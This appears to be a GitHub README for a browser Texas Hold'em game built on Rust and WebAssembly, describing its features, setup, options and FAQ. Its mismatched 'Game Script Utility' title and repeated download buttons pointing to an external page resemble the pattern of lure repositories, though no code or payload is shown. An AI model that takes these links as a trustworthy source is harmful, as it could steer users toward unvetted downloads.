# pkarena0-web v2026 - Game Script Utility 2026

> A browser-first Texas Hold'em title for solo sessions, powered by an offline-capable Rust and WebAssembly engine. Face AI opponents, inspect hand history, and optionally turn on audio narration.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ethanutobaker5782/pkarena0-web-script-utility?style=flat-square)](https://github.com/ethanutobaker5782/pkarena0-web-script-utility)

---

<p align="center">
  <a href="https://ethanutobaker5782.github.io/pkarena0-web-script-utility/">
    <img src="https://img.shields.io/badge/Download-pkarena0-web%20Script-brightgreen?style=for-the-badge" alt="Download pkarena0-web Script">
  </a>
</p>

> **[Direct Download - pkarena0-web](https://ethanutobaker5782.github.io/pkarena0-web-script-utility/)**

---

[Download Latest Build](https://ethanutobaker5782.github.io/pkarena0-web-script-utility/)

---

## What it is

pkarena0-web delivers Texas Hold'em directly in the browser for one player and eight AI bots. Once the page has loaded, the game can keep running without a network connection because the play logic lives in a client-side Rust engine compiled to WebAssembly. The design keeps the table loop lean and web-friendly, with the spotlight on hands, bot decisions, and round results.

It also supports exporting hand history to YAML so sessions can be stored or inspected later. An optional experimental narration track adds audio feedback, and animated bot moves plus showdown sequences make each hand easier to follow. Any update to the project should be understood in terms of browser support, offline behavior, and ongoing refinement of the poker core.

## Script Features

- Play Texas Hold'em against eight AI opponents
- Run entirely in the browser without requiring a network connection after loading
- Use a Rust game engine compiled to WebAssembly for client-side play
- Follow animated bot actions during betting and round progression
- View showdown reveals with clearer hand resolution feedback
- Export hand history in YAML format for later review or external tooling
- Enable optional experimental audio narration when desired
- Keep the experience centered on single-player poker sessions

## Setup

1. Open the project in a modern browser.
2. Load the provided HTML entry point or the published build link.
3. If you are using a local copy, keep the web assets together in the same folder so the page can load its scripts and compiled WebAssembly files correctly.
4. Start a table and play a session against the AI bots.

Example launch flow:

- Download the latest build
- Extract or place the files in a web-accessible directory
- Open the main HTML page in your browser

## Options

| Setting | Description | Notes |
| --- | --- | --- |
| Audio narration | Enables the experimental narration layer | Optional |
| Hand history export | Saves sessions as YAML | Useful for review |
| Offline mode | Keeps gameplay local after load | Browser-based |
| AI table size | Fixed at eight AI opponents | Core gameplay |
| Display animations | Shows bot actions and showdown reveals | Part of the presentation |

Most controls are presented through the browser UI, where standard poker actions and round prompts drive the session. Any available switches should be changed either in the game interface or through build-specific configuration exposed by the project.

## Compatibility

pkarena0-web is built for web browsers and uses HTML together with a Rust-to-WebAssembly client engine. Since the gameplay runs locally in the browser, the main requirement is support for WebAssembly plus whatever the packaged assets need in order to load correctly.

Known constraints to keep in mind:

- Best suited for modern desktop browsers
- Offline play depends on loading the required files successfully first
- The optional narration feature may not be available in every build or browser setup
- YAML export depends on the session data available in the current run

## FAQ

### How do I start playing?
Open the published build or local HTML entry point in a compatible browser, then begin a new Texas Hold'em session.

### Does it need an internet connection?
No, the game is designed for offline play after the initial load.

### Can I review past hands?
Yes, hand history can be exported in YAML format.

### Is the audio feature required?
No, audio narration is optional and experimental.

### What kind of opponents are included?
The game includes eight AI bots for single-player play.

### Can I customize the experience?
Customization depends on the available build options and UI controls. Check the published release or local package for any exposed toggles.

### Where should the files be stored?
Keep the HTML file, WebAssembly output, and supporting assets in the same folder structure provided by the build.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
